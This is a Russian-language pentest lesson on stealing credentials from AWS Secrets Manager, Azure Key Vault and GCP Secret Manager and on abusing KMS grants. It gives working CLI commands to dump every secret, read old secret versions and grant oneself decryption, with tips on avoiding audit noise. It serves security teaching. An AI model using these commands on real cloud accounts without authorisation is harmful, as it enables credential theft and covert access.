---
id: cloud-secrets-manager
title: "Секрет-менеджеры: Secrets Manager, Key Vault и KMS"
category: cloud
parent: cloud-credential-hunting
difficulty: hard
order: 2
tags: [cloud, secrets-manager, key-vault, kms, secrets, encryption, credential-hunting]
prerequisites: [cloud-credential-hunting, cloud-iam-basics]
useful_for:
  - "Охота за секретами в облачных хранилищах"
  - "Понимание KMS и шифрования"
  - "Пентест и red team"
estimated_minutes: 45
summary: "Как находить и извлекать секреты из AWS Secrets Manager, Azure Key Vault и GCP Secret Manager, и как злоупотреблять KMS. Практические команды и типовые мисконфиги."
---

## Вопрос, с которого всё начинается

Разработчикам надоело держать пароли в переменных окружения — они текут в логи и дампы. Поэтому появились **секрет-менеджеры**: централизованные хранилища паролей, ключей и токенов, где доступ выдаётся правами, а каждое чтение пишется в аудит. Звучит надёжно.

Но если права выданы слишком широко, хранилище превращается в «одну кнопку»: одно право — и на руках все креды компании сразу. Вопрос урока: как выкачать секреты из такого хранилища и как злоупотребить шифрованием.

## Наш пример: роль с широким доступом

У нас есть облачная **роль** (временная учётная запись для сервиса) `app-role`, и мы обнаружили, что ей разрешено `secretsmanager:GetSecretValue` на всё: `"Resource": "*"`. Проверим, что она видит. Для AWS хранилище называется **Secrets Manager**:

```
$ aws secretsmanager list-secrets --query 'SecretList[].Name'
["prod/db", "prod/api-keys", "stripe/live"]
```

Три секрета. Это уже карта: мы знаем, что именно стоит красть.

## Шаг 1: читаем значения

Каждый секрет — отдельная сущность с ARN (идентификатором) и версиями. Читаем по одному:

```
$ aws secretsmanager get-secret-value --secret-id prod/db --query 'SecretString' --output text
{"username":"admin","password":"S3cr3t-Pg-Pass","host":"db.prod.internal"}
```

Пароль к продакшен-базе в открытом виде. Дальше по списку:

```
$ aws secretsmanager get-secret-value --secret-id stripe/live --query 'SecretString' --output text
sk_live_51H8...
```

Ключ платёжного сервиса. Обрати внимание: каждое чтение — это `GetSecretValue`, и оно **всегда** фиксируется в CloudTrail. В отличие от чтения S3 (которое логируется только с data events), секреты «тихо» не украдёшь.

## Шаг 2: почему это открылось

За доступ отвечает **resource policy** — политика, привязанная к самому секрету. Частый мисконфиг — разрешение для всех:

```
$ aws secretsmanager get-resource-policy --secret-id prod/db
{"Statement":[{"Effect":"Allow","Principal":"*","Action":"secretsmanager:GetSecretValue"}]}
```

`Principal: "*"` означает «любой субъект», и без условия это открывает секрет широкому кругу. Другой вариант — секрет доступен целой managed identity, которая есть у каждого пода кластера.

## Шаг 3: у других провайдеров — то же самое

Модель одинакова, меняются команды.

**Azure Key Vault** хранит секреты, ключи и сертификаты. Доступ — через RBAC или Access Policies:

```
$ az keyvault list --query '[].name'
$ az keyvault secret list --vault-name kv-prod --query '[].id'
$ az keyvault secret show --vault-name kv-prod --name db-password --query value -o tsv
```

**GCP Secret Manager**:

```
$ gcloud secrets list --format='value(name)'
$ gcloud secrets versions access latest --secret=db-password
```

В GCP частая ошибка — выдать сервисному аккаунту пода роль `roles/secretmanager.secretAccessor`. Тогда любой SSRF или выполнение кода в поде = чтение секретов.

## Шаг 4: KMS — не только хранилище, но и шифрование

Секреты защищают **KMS** — сервис управления ключами шифрования. Атакующему важны два права:

- **`kms:Decrypt`** — расшифровать перехваченный шифротекст;
- **`kms:CreateGrant`** — выдать доступ к чужому ключу.

```
$ aws kms list-keys
$ aws kms get-key-policy --key-id <id> --policy-name default
$ aws kms decrypt --ciphertext-blob fileb://enc.bin --query Plaintext --output text | base64 -d
```

`CreateGrant` коварен: даже без `Decrypt` ты можешь сначала выдать себе право на расшифровку:

```
$ aws kms create-grant --key-id <id> \
  --grantee-principal arn:aws:iam::111122223333:user/me --operations Decrypt
```

Политика ключа с `Principal: "*"` или `kms:Decrypt` на `*` — типовой мисконфиг. И помни разницу: права на объект и права на ключ — разные. Можно иметь `s3:GetObject`, но получить `AccessDenied` из-за запрета `kms:Decrypt`.

## Шаг 5: откуда секреты текут помимо менеджера

- **Terraform/CloudFormation** — пароли баз данных в открытом виде в state и plan.
- **Переменные окружения функций и подов** — утекают в логи, дампы памяти, `docker inspect`.
- **Helm-чарты и CI-переменные** — `printenv` в раннере покажет «protected» переменную.
- **Kubernetes Secrets** — объекты в etcd и CSI-драйверы.

Ищи ссылки на хранилища по коду: `grep -rE 'secretsmanager|keyvault|secretmanager|SecretString' . --hidden`.

## Шаг 6: собираем всё разом

Когда прав много, читать секреты по одному долго — автоматизируем. Список имён из `list-secrets` подаём на вход `get-secret-value`:

```
$ aws secretsmanager list-secrets --query 'SecretList[].Name' --output text | tr '\t' '\n' | \
    while read s; do echo "== $s"; aws secretsmanager get-secret-value --secret-id "$s" \
    --query SecretString --output text; done
== prod/db
{"username":"admin","password":"S3cr3t-Pg-Pass","host":"db.prod.internal"}
== stripe/live
sk_live_51H8...
```

Полезно помнить про версии: у секрета их несколько, и `get-secret-value` по умолчанию отдаёт `AWSCURRENT`. Старая версия может содержать ещё живой ключ, который просто не успели отозвать:

```
$ aws secretsmanager get-secret-value --secret-id prod/db \
    --version-stage AWSPREVIOUS --query SecretString --output text
{"username":"admin","password":"Old-Pg-Pass-2019"}
```

У GCP аналогично: `gcloud secrets versions list`, затем `access` нужной версии. Каждое такое чтение снова попадает в аудит — «собрать всё разом» быстрее, но и заметнее. Поэтому в реальной работе сначала уточняют, какие секреты действительно нужны для следующего шага, и читают только их.

Ещё пригодится `describe-secret`: он показывает `LastRotatedDate` и `RotationEnabled`. Секрет, который не ротировали годами, — лучшая цель: его значение наверняка всё ещё действует где-то в продакшене, а отзыв такого ключа никто не заметит до следующего аудита.

## Что мы теперь знаем

1. Секрет-менеджер безопасен ровно настолько, насколько узки права.
2. `list-secrets` даёт карту, `get-secret-value` — значения; `GetSecretValue` всегда в аудите.
3. Resource policy с `Principal: *` открывает секрет наружу.
4. `kms:Decrypt` расшифровывает данные, `kms:CreateGrant` позволяет выдать себе доступ.
5. Секреты всё ещё текут из IaC, env и Kubernetes — не только из менеджера.
6. `describe-secret` показывает ротацию: давно не ротировавшийся секрет — самая живучая и незаметная цель атаки.

## На что смотреть дальше

- **Права важнее «безопасности по названию».** Хранилище защищено ровно настолько, насколько узка политика.
- **Проверяй версии секрета.** Старая версия может содержать ещё действующий ключ.
- **Помни про аудит.** `GetSecretValue`/`Decrypt` логируются — не шуми лишними чтениями.
- **Смотри key policy.** Широкий доступ к ключу равносилен доступу ко всем зашифрованным секретам.

## Квиз

Проверь себя.

```quiz
- question: "Какое право AWS KMS позволяет расшифровать ciphertext?"
  options:
    - "kms:Decrypt"
    - "kms:Encrypt"
    - "kms:ListKeys"
    - "kms:DescribeKey"
  answer: 0
  explanation: "Decrypt превращает ciphertext в plaintext."
- question: "Чем опасно kms:CreateGrant?"
  options:
    - "Позволяет выдать себе или другому Decrypt на чужой ключ"
    - "Удаляет ключ"
    - "Меняет регион"
    - "Оно безвредно"
  answer: 0
  explanation: "Грант делегирует операции с ключом."
- question: "Где в Azure читаются секреты?"
  options:
    - "az keyvault secret show"
    - "az vm list"
    - "az network vnet list"
    - "az account list"
  answer: 0
  explanation: "Key Vault хранит секреты/ключи/сертификаты."
- question: "Какую роль GCP даёт SA для чтения секретов?"
  options:
    - "roles/secretmanager.secretAccessor"
    - "roles/viewer"
    - "roles/storage.admin"
    - "roles/iam.securityReviewer"
  answer: 0
  explanation: "secretAccessor позволяет читать версии секретов."
- question: "Почему чтение секрета в AWS не бывает «тихим»?"
  options:
    - "GetSecretValue всегда логируется в CloudTrail"
    - "Секреты шифруются на клиенте"
    - "Требуется root"
    - "Оно удаляет бакет"
  answer: 0
  explanation: "В отличие от S3 GetObject, доступ к Secrets Manager фиксируется всегда."
```

## Куда дальше

В следующем уроке (`cloud-cloudtrail-evasion`) мы разберём, как защита видит эти чтения и какие техники снижения шума существуют. А пока главное: секрет-менеджер — это концентрат кредов, и слишком широкая политика делает его самым вкусным местом в аккаунте.

## Где пригодится

- **Red team / пентест:** быстрый сбор кредов из хранилищ.
- **Bug bounty:** мисконфиги resource policy и IAM.
- **CTF:** облачные задачи с секрет-менеджером и KMS.
- **Работа/DevSecOps:** least-privilege на секреты, аудит грантов KMS.
- **Дальше по дереву:** `cloud-credential-hunting`, `cloud-privesc-iam`.
